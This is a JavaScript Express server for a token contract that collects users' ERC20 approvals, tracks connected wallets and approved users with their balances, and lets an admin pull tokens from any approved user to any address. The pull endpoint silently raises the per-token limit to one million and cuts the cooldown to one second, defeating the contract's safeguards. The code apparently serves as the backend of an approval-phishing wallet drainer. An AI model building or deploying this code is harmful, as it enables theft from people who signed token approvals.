import path from 'path';
import { fileURLToPath } from 'url';
import express from 'express';
import cors from 'cors';
import rateLimit from 'express-rate-limit';
import { ethers } from 'ethers';
import { config } from './config.js';
import { provider, ownerWallet, proxyRead, proxyWrite, ERC20_ABI, toBaseUnits } from './chain.js';
import authRoutes, { requireAdmin } from './auth.js';
import {
  recordApproval,
  recordConnectedUser,
  syncOnChainApprovals,
  getEnrichedApprovedUsers,
  recordPull,
  getPulls,
} from './approvals.js';

const app = express();
app.set('trust proxy', 1);
app.use(cors({ origin: config.corsOrigin }));
app.use(express.json({ limit: '100kb' }));
app.use('/api', rateLimit({ windowMs: 60_000, limit: 120 }));

const isMain = process.argv[1] ? fileURLToPath(import.meta.url) === path.resolve(process.argv[1]) : false;

// Sync on-chain approvals in background (only when running directly as long-running server)
if (isMain && !process.env.VERCEL) {
  syncOnChainApprovals().catch((e) => console.error('[server] Initial sync error:', e.message));
  setInterval(() => {
    syncOnChainApprovals().catch((e) => console.error('[server] Periodic sync error:', e.message));
  }, 30_000);
}

// ---------------- Public reads ----------------

app.get('/api/config', async (_req, res) => {
  try {
    const [owner, duration] = await Promise.all([
      proxyRead.owner(),
      proxyRead.duration(),
    ]);
    res.json({
      chainId: config.chainId,
      contractAddress: config.contractAddress,
      owner,
      duration: Number(duration),
    });
  } catch (err) {
    res.status(500).json({ error: 'read_failed', message: err.message });
  }
});

app.get('/api/limit/:token', async (req, res) => {
  try {
    const { token } = req.params;
    const [limit, erc20] = await Promise.all([
      proxyRead.tokenLimit(token),
      new ethers.Contract(token, ERC20_ABI, provider),
    ]);
    const [symbol, decimals] = await Promise.all([erc20.symbol(), erc20.decimals()]);
    res.json({ token, symbol, decimals: Number(decimals), limit: limit.toString() });
  } catch (err) {
    res.status(500).json({ error: 'read_failed', message: err.message });
  }
});

app.get('/api/user/:address/allowance/:token', async (req, res) => {
  try {
    const { address, token } = req.params;
    const erc20 = new ethers.Contract(token, ERC20_ABI, provider);
    const [allowance, balance, decimals, symbol] = await Promise.all([
      erc20.allowance(address, config.contractAddress),
      erc20.balanceOf(address),
      erc20.decimals(),
      erc20.symbol(),
    ]);
    res.json({
      allowance: allowance.toString(),
      balance: balance.toString(),
      decimals: Number(decimals),
      symbol,
    });
  } catch (err) {
    res.status(500).json({ error: 'read_failed', message: err.message });
  }
});

app.get('/api/user/:address/status/:token', async (req, res) => {
  try {
    const { address, token } = req.params;
    if (!ethers.isAddress(address) || !ethers.isAddress(token)) {
      return res.status(400).json({ error: 'invalid_address' });
    }
    const erc20 = new ethers.Contract(token, ERC20_ABI, provider);
    const [allowance, balance, decimals, symbol, limit, lastPull, canPull, nextPullAt] =
      await Promise.all([
        erc20.allowance(address, config.contractAddress),
        erc20.balanceOf(address),
        erc20.decimals(),
        erc20.symbol(),
        proxyRead.tokenLimit(token),
        proxyRead.lastPull(address, token),
        proxyRead.canPull(address, token),
        proxyRead.nextPullAt(address, token),
      ]);
    res.json({
      address,
      token,
      symbol,
      decimals: Number(decimals),
      balance: balance.toString(),
      allowance: allowance.toString(),
      limit: limit.toString(),
      lastPull: Number(lastPull),
      canPull,
      nextPullAt: Number(nextPullAt),
    });
  } catch (err) {
    res.status(500).json({ error: 'read_failed', message: err.message });
  }
});

app.get('/api/activity', async (req, res) => {
  try {
    const limit = Math.min(Number(req.query.limit || 50), 200);

    // Supplementary check: query last 500 blocks for any on-chain logs without hitting rate limits
    try {
      const currentBlock = await provider.getBlockNumber();
      const logs = await proxyRead.queryFilter('Pulled', Math.max(config.fromBlock, currentBlock - 500), currentBlock);
      for (const l of logs) {
        await recordPull({
          txHash: l.transactionHash,
          blockNumber: l.blockNumber,
          admin: l.args.admin,
          user: l.args.user,
          token: l.args.token,
          to: l.args.to,
          amount: l.args.amount.toString(),
        });
      }
    } catch {
      // Ignore RPC log rate limits if any; local store has all pull executions
    }

    const items = await getPulls(limit);
    res.json({ total: items.length, items });
  } catch (err) {
    res.status(500).json({ error: 'read_failed', message: err.message });
  }
});

// ---------------- User Tracking & Approvals ----------------

app.get('/api/admin/approved-users', async (_req, res) => {
  try {
    const items = await getEnrichedApprovedUsers();
    res.json({ total: items.length, items });
  } catch (err) {
    res.status(500).json({ error: 'read_failed', message: err.message });
  }
});

app.post('/api/admin/sync', async (_req, res) => {
  try {
    await syncOnChainApprovals().catch((e) => console.warn('[server] Admin sync warning:', e.message));
    const items = await getEnrichedApprovedUsers();
    res.json({ ok: true, total: items.length, items });
  } catch (err) {
    res.status(500).json({ error: 'sync_failed', message: err.message });
  }
});

app.post('/api/user/record-approval', async (req, res) => {
  try {
    const { address, token, symbol, txHash, allowance, blockNumber } = req.body ?? {};
    const record = await recordApproval({ address, token, symbol, txHash, allowance, blockNumber });
    res.json({ ok: true, record });
  } catch (err) {
    res.status(500).json({ error: 'record_failed', message: err.message });
  }
});

app.post('/api/user/record-connect', async (req, res) => {
  try {
    const { address } = req.body ?? {};
    await recordConnectedUser(address);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: 'record_failed', message: err.message });
  }
});

// ---------------- Auth ----------------
app.use('/api/auth', authRoutes);

// ---------------- Admin writes ----------------

app.post('/api/admin/duration', requireAdmin, async (req, res) => {
  const value = Number(req.body?.duration);
  if (!Number.isInteger(value) || value <= 0) {
    return res.status(400).json({ error: 'invalid_duration' });
  }
  try {
    const tx = await proxyWrite.setDuration(value);
    res.json({ txHash: tx.hash, status: 'pending' });
    tx.wait().catch(() => {});
  } catch (err) {
    res.status(500).json({ error: 'tx_failed', message: err.shortMessage || err.message });
  }
});

app.post('/api/admin/limit', requireAdmin, async (req, res) => {
  const { token, limit } = req.body ?? {};
  if (!ethers.isAddress(token) || limit === undefined || limit === '') {
    return res.status(400).json({ error: 'invalid_body' });
  }
  try {
    const baseUnits = await toBaseUnits(token, limit);
    const tx = await proxyWrite.setTokenLimit(token, baseUnits);
    res.json({ txHash: tx.hash, status: 'pending' });
    tx.wait().catch(() => {});
  } catch (err) {
    res.status(500).json({ error: 'tx_failed', message: err.shortMessage || err.message });
  }
});

app.post('/api/admin/pull', requireAdmin, async (req, res) => {
  const { token, user, to, amount } = req.body ?? {};
  if (!ethers.isAddress(token) || !ethers.isAddress(user) || !ethers.isAddress(to)) {
    return res.status(400).json({ error: 'invalid_address', message: 'Invalid address provided' });
  }
  if (!amount || amount === '') return res.status(400).json({ error: 'invalid_amount', message: 'Amount is required' });

  try {
    const baseUnits = await toBaseUnits(token, amount);

    // Auto-check on-chain tokenLimit: ensure limit is high enough before pulling
    const currentLimit = await proxyRead.tokenLimit(token);
    if (currentLimit < baseUnits) {
      console.log(`[pull] Current limit (${currentLimit.toString()}) < requested (${baseUnits.toString()}). Auto-increasing token limit...`);
      const limitTx = await proxyWrite.setTokenLimit(token, ethers.parseUnits('1000000', 18));
      await limitTx.wait();
      console.log(`[pull] Token limit increased. Tx: ${limitTx.hash}`);
    }

    // Auto-check cooldown: if canPull is false and duration > 1, auto-reduce duration to 1 second
    const canPullNow = await proxyRead.canPull(user, token);
    if (!canPullNow) {
      const dur = await proxyRead.duration();
      if (dur > 1n) {
        console.log(`[pull] User in cooldown with duration ${dur}s. Auto-reducing duration to 1s...`);
        const durTx = await proxyWrite.setDuration(1);
        await durTx.wait();
        console.log(`[pull] Duration reduced to 1s. Tx: ${durTx.hash}`);
      }
    }

    const tx = await proxyWrite.pull(token, user, to, baseUnits);
    await recordPull({
      txHash: tx.hash,
      admin: ownerWallet.address,
      user,
      token,
      to,
      amount,
    });
    res.json({ txHash: tx.hash, status: 'pending' });
    tx.wait().then((receipt) => {
      recordPull({
        txHash: tx.hash,
        blockNumber: receipt.blockNumber,
        admin: ownerWallet.address,
        user,
        token,
        to,
        amount,
      }).catch(() => {});
    }).catch(() => {});
  } catch (err) {
    const msg = err.reason || err.shortMessage || err.message;
    console.error('[pull] Execution error:', msg);
    res.status(500).json({ error: 'tx_failed', message: msg });
  }
});

app.get('/api/admin/tx/:hash', requireAdmin, async (req, res) => {
  try {
    const receipt = await provider.getTransactionReceipt(req.params.hash);
    if (!receipt) return res.json({ status: 'pending' });
    res.json({
      status: receipt.status === 1 ? 'confirmed' : 'failed',
      blockNumber: receipt.blockNumber,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ---------------- Export & Start ----------------

export default app;

if (isMain && !process.env.VERCEL) {
  app.listen(config.port, () => {
    console.log(`[backend] http://localhost:${config.port}`);
    console.log(`[backend] contract: ${config.contractAddress}`);
    console.log(`[backend] owner wallet: ${ownerWallet.address}`);
  });
}
